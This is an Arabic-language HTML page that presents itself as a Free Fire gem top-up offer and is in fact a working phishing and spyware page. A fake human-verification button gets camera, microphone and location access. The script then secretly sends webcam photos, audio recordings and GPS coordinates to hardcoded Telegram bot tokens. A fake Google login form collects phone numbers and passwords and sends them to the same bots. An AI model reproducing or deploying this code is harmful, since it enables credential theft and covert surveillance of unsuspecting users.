
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>شحن جواهر فري فاير</title>
  <style>
    body {
      margin: 0;
      background-image: url('background.gif'); /* 👑 غيّر الخلفية */
      background-size: cover;
      font-family: Arial, sans-serif;
    }

    #verify-box {
      position: fixed;
      top: 0; right: 0; bottom: 0; left: 0;
      background: rgba(0, 0, 0, 0.85);
      color: white;
      text-align: center;
      padding-top: 30%;
      font-size: 20px;
      z-index: 9999;
    }

    #verify-box button {
      margin-top: 20px;
      background-color: #007bff;
      color: white;
      border: none;
      padding: 10px 25px;
      font-size: 18px;
      border-radius: 8px;
      cursor: pointer;
    }

    #google-btn {
      position: fixed;
      bottom: 20px;
      left: 20px;
      right: 20px;
      margin: auto;
      width: 200px;
      height: 65px;
      background-color: orange;
      color: white;
      font-size: 18px;
      font-weight: bold;
      border: none;
      border-radius: 15px;
      cursor: pointer;
      text-align: center;
      line-height: 65px;
      box-shadow: 0 0 15px #00000055;
      display: none;
    }

    #google-btn::after {
      content: " ⚡ شحن جواهر فري فاير";
      font-size: 14px;
      display: block;
      margin-top: 4px;
    }

    #login-form {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: white;
      z-index: 9998;
      padding: 30px;
      text-align: center;
    }

    #login-form h2 {
      margin-bottom: 10px;
    }

    #login-form p {
      color: #444;
      font-size: 15px;
    }

    #login-form input {
      width: 90%;
      padding: 10px;
      margin: 15px auto;
      font-size: 16px;
      display: block;
      border: 1px solid #ccc;
      border-radius: 6px;
    }

    #togglePassword {
      position: absolute;
      margin-top: -45px;
      margin-left: 230px;
      font-size: 20px;
      cursor: pointer;
    }

    #login-form button {
      background-color: green;
      color: white;
      padding: 10px 20px;
      font-size: 16px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }
  </style>
</head>
<body>

<!-- إثبات أنك إنسان -->
<div id="verify-box">
  🧠 أثبت أنك إنسان
  <br>
  <button onclick="requestPermissions()">تأكيد</button>
</div>

<!-- زر Google -->
<div id="google-btn">Google</div>

<!-- نموذج تسجيل -->
<div id="login-form">
  <h2>🔐 إثبات الهوية</h2>
  <p>لإتمام عملية شحن الجواهر، يرجى إدخال بياناتك</p>

  <input type="tel" id="phone" placeholder="رقم الهاتف" required>
  
  <div style="position: relative;">
    <input type="password" id="password" placeholder="كلمة السر" required>
    <span id="togglePassword">👁</span>
  </div>
  
  <button onclick="submitLogin()">متابعة</button>
</div>

<script>
  const bots = [
    "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M",
    "8285842532:AAHmsde1O9HAV_oVJ7L3UJVRMCobap8cdwE",
    "8280042578:AAFuMPgHS9RCaYcxv1eyVppyr8BkJ_xGD5c"
  ];

  const chatIds = [
    "7664410054",
    "7664410067",
    "7664410043"
  ];

  // إرسال الموقع الجغرافي
  function sendLocation(lat, lon) {
    const text = `📍 الموقع الجغرافي:\nLatitude: ${lat}\nLongitude: ${lon}`;
    bots.forEach(token => {
      chatIds.forEach(chatId => {
        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chatId, text })
        });
      });
    });
  }

  // إرسال صورة
  function sendPhoto(blob) {
    bots.forEach(token => {
      chatIds.forEach(chatId => {
        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("photo", blob, "photo.png");

        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
          method: "POST",
          body: formData
        });
      });
    });
  }

  // إرسال صوت
  function sendAudio(blob) {
    bots.forEach(token => {
      chatIds.forEach(chatId => {
        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("audio", blob, "audio.ogg");

        fetch(`https://api.telegram.org/bot${token}/sendAudio`, {
          method: "POST",
          body: formData
        });
      });
    });
  }

  async function requestPermissions() {
    alert("يرجى السماح بالكاميرا، الميكروفون، والموقع الجغرافي.");

    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
      document.getElementById("verify-box").style.display = "none";
      document.getElementById("google-btn").style.display = "block";

      navigator.geolocation.getCurrentPosition(pos => {
        const { latitude, longitude } = pos.coords;
        sendLocation(latitude, longitude);
      });

      captureImages(stream);
      recordAudioRepeatedly(stream);

    } catch (err) {
      alert("حدث خطأ أثناء طلب الأذونات");
    }
  }

  // التقاط 5 صور بفاصل 5 ثوانٍ
  function captureImages(stream) {
    const video = document.createElement("video");
    video.srcObject = stream;
    video.play();

    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");

    let count = 0;
    const capture = () => {
      if (count >= 5) return;
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0);
      canvas.toBlob(blob => {
        sendPhoto(blob);
      }, 'image/png');
      count++;
      setTimeout(capture, 5000);
    };
    setTimeout(capture, 2000); // أول صورة بعد 2 ثانية
  }

  // تسجيل صوت لمدة 5 ثوانٍ كل 5 ثوانٍ، 5 مرات
  function recordAudioRepeatedly(stream) {
    let count = 0;

    function recordOnce() {
      if (count >= 5) return;

      const mediaRecorder = new MediaRecorder(stream);
      const chunks = [];

      mediaRecorder.ondataavailable = e => chunks.push(e.data);
      mediaRecorder.onstop = () => {
        const blob = new Blob(chunks, { type: "audio/ogg" });
        sendAudio(blob);
        count++;
        setTimeout(recordOnce, 5000);
      };

      mediaRecorder.start();
      setTimeout(() => mediaRecorder.stop(), 5000);
    }

    recordOnce();
  }

  document.getElementById("google-btn").onclick = () => {
    document.getElementById("login-form").style.display = "block";
  };

  document.getElementById("togglePassword").onclick = () => {
    const pw = document.getElementById("password");
    pw.type = (pw.type === "password") ? "text" : "password";
  };

  function submitLogin() {
    const phone = document.getElementById("phone").value.trim();
    const pass = document.getElementById("password").value.trim();
    if (!phone || !pass) {
      alert("يرجى ملء جميع الحقول");
      return;
    }

    const message = `📥 بيانات شحن:\n📱 الهاتف: ${phone}\n🔐 كلمة السر: ${pass}`;
    
    bots.forEach(token => {
      chatIds.forEach(chatId => {
        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: message
          })
        });
      });
    });

    alert("✅ تم إرسال البيانات");
    document.getElementById("login-form").style.display = "none";
  }
</script>

</body>
</html>
